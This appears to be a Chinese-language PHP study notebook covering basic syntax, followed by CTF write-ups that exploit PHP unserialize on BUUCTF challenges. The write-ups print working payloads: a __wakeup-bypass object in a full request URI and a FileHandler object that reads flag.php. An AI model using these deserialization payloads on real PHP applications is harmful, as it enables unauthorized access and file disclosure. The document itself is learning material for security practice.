# PHP 备忘录

> PHP 是最早的 Web 开发语言之一，它在 Web 开发历史上占有重要地位。
> 但它快死了。

[PHP 学习路线](https://www.runoob.com/w3cnote/php-learning-recommend.html)

!!! tip "学习路线"
    1. 熟悉 HTML/CSS/JS 等网页基本元素，完成阶段可自行制作简单的网页，对元素属性相对熟悉。
    2. 理解动态语言的概念和运做机制，熟悉基本的 PHP 语法。
    3. 学习如何将 PHP 与 HTML 结合起来，完成简单的动态页面。
    4. 接触学习 MySQL，开始设计数据库。
    5. 不断巩固 PHP 语法，熟悉大部分的 PHP 常用函数，理解面向对象编程，MySQL 优化，以及一些模板和框架。
    6. 最终完成一个功能齐全的动态站点。

## 基础语法

!!! note "优化之前写过的评论网页"

- PHP 是一种开源的通用脚本语言，尤其适用于 Web 开发。
- PHP（全称：PHP：Hypertext Preprocessor，即"PHP：超文本预处理器"）是一种通用开源脚本语言。
- 有对应的解析器
- 弱类型语言，~~感觉和 python 有点像，但是学的不太透彻讲不出来~~

### 常量&变量&数组

```php
<?php
// 这是 PHP 单行注释

/*
这是
PHP 多行
注释
*/

$name = "John"; // 字符串变量
$age = 25;      // 整数变量
$height = 1.75; // 浮点数变量
$isStudent = true; // 布尔变量
global $x,$y;//在函数内调用函数外定义的全局变量，我们需要在函数中的变量前加上 global 关键字

// 常量声明
bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )

const CONSTANT_NAME = "value";

// 区分大小写的常量名
define("GREETING", "欢迎访问 Runoob.com");
echo GREETING;    // 输出 "欢迎访问 Runoob.com"
echo greeting;   // 输出 "greeting"，但是有警告信息，表示该常量未定义
?>
```

PHP 文件的默认文件扩展名是 `.php`。

常量对大小写敏感，全局的。

### 输入输出

**echo** - 可以输出一个或多个字符串
**print** - 只允许输出一个字符串，返回值总为 1
提示：echo 输出的速度比 print 快，echo 没有返回值，print 有返回值 1。

```php
<?php
echo "<h2>PHP 很有趣!</h2>";
echo "Hello world!<br>";
echo "我要学 PHP!<br>";
echo "这是一个", "字符串，", "使用了", "多个", "参数。";
?>

<?php
$txt1="学习 PHP";
$txt2="RUNOOB.COM";
$cars=array("Volvo","BMW","Toyota");
 
print $txt1;
print "<br>";
print "在 $txt2 学习 PHP ";
print "<br>";
print "我车的品牌是 {$cars[0]}";
?>
```

定界符 EOF

**超级全局变量** 在 PHP 4.1.0 之后被启用，是 PHP 系统中自带的变量，在一个脚本的全部作用域中都可用。

**魔术常量：** 有八个魔术常量它们的值随着它们在代码中的位置改变而改变。

- 数值数组：带有数字 ID 键的数组
- 关联数组：带有指定的键的数组，每个键关联一个值
- 多维数组：包含一个或多个数组的数组

```php
<?php
$cars=array("Volvo","BMW","Toyota");//数值数组
$age=array("Peter"=>"35","Ben"=>"37","Joe"=>"43");//关联数组
//遍历关联数组
$age=array("Peter"=>"35","Ben"=>"37","Joe"=>"43");
foreach($age as $x=>$x_value)
{
    echo "Key=" . $x . ", Value=" . $x_value;
    echo "<br>";
}
?>
```

`count()`函数用于返回数组的长度（元素的数量）：

### 运算

- 松散比较：使用两个等号 `==` 比较，只比较值，不比较类型。
- 严格比较：用三个等号 `===` 比较，除了比较值，也比较类型。
![image](https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/CS__Dev__Backend__assets__PHP.assets__20240702171832.webp)

```php
<?php
~ // 二进制取反
a.b //并置 "Hi"."Ha" → HiHa
x == y //等于
x === y //绝对等于 (类型 & 值)
x <> y //不等于
?>
```

### 结构

写法和 c 一样

```php
<?php
if (条件)
{
    if 条件成立时执行的代码;
}
elseif (条件)
{
    elseif 条件成立时执行的代码;
}
else
{
    条件不成立时执行的代码;
}
?>
```

函数

变量函数是指在 PHP 中，将一个变量作为函数名来调用的函数。
变量函数可以让我们在运行时动态地决定调用哪个函数。

```php
<?php
function functionName()
{
    // 要执行的代码
}

$func = 'foo';
$func();        // 调用 foo()

$func = 'bar';
$func('test');  // 调用 bar()
?>
```

## 高级特性

### PHP 表单

### PHP + MySQL

## 实战案例

获取 GET 参数与 Cookie 并查询数据库对应的用户

```php
<?php
// 数据库连接信息
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "test_db";

// 创建数据库连接
$conn = new mysqli($servername, $username, $password, $dbname);

// 检查连接是否成功
if ($conn->connect_error) {
    die("连接失败：" . $conn->connect_error);
}

// 获取 GET 参数
$userId = isset($_GET['user_id']) ? intval($_GET['user_id']) : 0;

// 获取 Cookie
$sessionId = isset($_COOKIE['session_id']) ? $_COOKIE['session_id'] : '';

// 查询数据库
if ($userId > 0) {
    $sql = "SELECT * FROM users WHERE id = $userId";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        $user = $result->fetch_assoc();
        echo "<p>用户信息：</p>";
        echo "<p>ID: " . $user['id'] . "</p>";
        echo "<p>姓名：" . $user['name'] . "</p>";
        echo "<p>邮箱：" . $user['email'] . "</p>";
    } else {
        echo "<p>没有找到对应的用户。</p>";
    }
} else {
    echo "<p>无效的用户 ID。</p>";
}

// 关闭数据库连接
$conn->close();
?>
```

## php 伪协议

[[WEB 安全]PHP 伪协议总结 - 肖洋肖恩、 - 博客园](https://www.cnblogs.com/-mo-/p/11736445.html)

## 序列化与反序列化

听老师课上讲其实没有太听明白，所以先看了一些其他的文档来入门。

[CTF 中的序列化与反序列化 - Hel10 - 博客园](https://www.cnblogs.com/HelloCTF/p/13044403.html)

### 实践

套路就是倒推

先找到需要什么样的结构，再实例化对象，根据状态修改后调整一些小的格式

将序列化的值当作参数传入

!!! note "最终的原因"
    PHP是弱类型的原因，我们可以利用这样的特性去绕过一些判断

#### [BUUCTF[极客大挑战 2019]PHP](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP)

![image](https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/CS__Dev__Backend__assets__PHP.assets__20240801190745.webp)

一进来是一个猫猫抓球的界面，你别说还挺好玩的嘞，不知道是怎么实现的。

首先提示了有备份，用 dirsearch 扫描一下，发现有`www.zip`

使用`http://ip of baji/www.zip`下载文件，获得网站的源码

在源码中找到了`index.php`，发现了`serialize`函数

```php linenums="1" hl_lines="3 11"
<?php
function __destruct(){
    if ($this->password != 100) {
        echo "</br>NO!!!hacker!!!</br>";
        echo "You name is: ";
        echo $this->username;echo "</br>";
        echo "You password is: ";
        echo $this->password;echo "</br>";
        die();
    }
    if ($this->username === 'admin') {
        global $flag;
        echo $flag;
    }else{
        echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
        die();
    }
}
?>
```

由高亮的两行可以看出，我们需要构造一个`username`为`admin`，`password`为`100`的对象

所以直接将它的代码复制出来，再创建一个`index.php`，将其粘贴进去。

```php
<?php
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }
}

$res = new Name('admin',100);
var_dump(serialize($res));
?>
```

结果是

```text
O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
```

又因为私有变量需要修改，所以更改为

!!! note "在反序列化时，当前属性个数大于实际属性个数时，就会跳过`__wakeup()`，去执行`__destruct`"

又因为需要绕过`__wakeup()`函数，所以我们把属性个数改成大于实际属性的个数

最后的请求 URI

```text
http://02801fc4-349c-428a-bb2c-2015f2934d2b.node5.buuoj.cn:81/?select=O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;}%22
```

#### challenge

上课老师讲的一个例题，主要核心思想就是利用 php 这种弱类型的语言。构造的 exp 是利用引用，使得两个变量一模一样，从而达到目的。

!!! note "类型"
        a - array
        b - boolean
        d - double
        i - integer
        o - common object
        r - reference
        s - non-escaped binary string
        S - escaped binary string
        C - custom object
        O - class
        N - null
        R - pointer reference
        U - unicode string

```php linenums="1" hl_lines="7"
<?php
class Exp {
    public $enter;
    public $secret;
}
$exp = new Exp();
$exp->enter = &$exp->secret;

$ser = serialize($exp);

var_dump($ser);
$o = unserialize($ser);

if ($o) {
    $o->secret = "AAA{php_unserialize}";
    if ($o->secret === $o->enter)
        echo "Congratulation! Here is my secret: ".$o->secret;
    else
        echo "Oh no... You can't fool me";
}
else echo "are you trolling?";
// string(45) "O:3:"Exp":2:{s:5:"enter";N;s:6:"secret";R:2;}"
// Congratulation! Here is my secret: AAA{php_unserialize}
?>
```

#### [[网鼎杯 2020 青龙组]AreUSerialz](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz)

```php
<?php

include("flag.php");

highlight_file(__FILE__);


class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

首先就是观察一下代码结构，发现是给 str 这个口传参数进去，然后进行反序列化。

然后考虑构造，首先第一个要求就是要通过`is_valid`函数，所以我们需要构造一个合法的可见字符串，也就是说 op，filename，content 都要是可见字符，另外也不能出现特殊字符。

观察 process 和 write 和 read 函数后发现，我们使用 write 函数并没有用，因为我们需要读取 flag.php 中的代码，所以只需要执行 read 就行。

而执行 read 的条件是`op=2`

所以初始化的时候，op 设置成 2，filename 是 flag.php，content 随便写一个。

使用下面的脚本生成第一版

```php
<?php
class FileHandler {
    protected $op=2;
    protected $filename='flag.php';
    protected $content='AAA';
}

$res = new FileHandler;
var_dump(serialize($res));
?>
```

输入 uri 后，发现不太对，返回的结果是`Bad Hacker!`，说明我们的构造不对。

再看了一遍代码，发现有两个地方用到了 op 的比较

分别是

```sql
$this->op == "2"

if($this->op === "2")
        $this->op = "1";
```

我们需要再第一个判断的时候进入 read 环节，而在第二个判断的时候不要进入 write 环节。所以我们使用数字二

和上一个例题一样，这一题也需要对类型进行更改。不然由于%00 这样的字符不可见所以过不了`is_valid()`函数。所以将 protected 改成 public，或者手动修改变量名称和长度也可以。

得到最后的 payload 如下

```text
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:3:"AAA";}"
```

![image](https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/CS__Dev__Backend__assets__PHP.assets__83c9510802e2eb9530436cae79d0c66.webp)

![image](https://philfan-pic.oss-cn-beijing.aliyuncs.com/web_pic/CS__Dev__Backend__assets__PHP.assets__6ffadb51805af7763ee6b9e5cc1eb81.webp)

这个 flag 跑了两个实例貌似是不一样的，所以贴 flag 貌似没什么用。
